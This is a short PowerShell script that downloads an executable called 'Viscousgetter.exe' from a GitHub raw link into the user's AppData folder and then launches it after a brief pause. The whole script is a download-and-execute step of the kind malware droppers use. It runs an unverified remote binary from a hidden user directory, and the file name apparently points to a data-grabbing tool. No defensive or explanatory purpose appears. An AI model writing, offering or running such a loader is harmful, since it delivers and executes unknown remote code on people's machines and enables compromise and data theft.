$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
$VISPath = "$env:AppData\Viscousgetter.exe"

# Download the file
Write-Host "Downloading the executable..."
Invoke-WebRequest -Uri $VIS -OutFile $VISPath

# Check if the file exists
if (Test-Path $VISPath) {
    Write-Host "File downloaded successfully. Attempting to execute..."
    Start-Sleep -Seconds 5
    Start-Process -FilePath $VISPath
} else {
    Write-Error "Failed to download the executable."
}
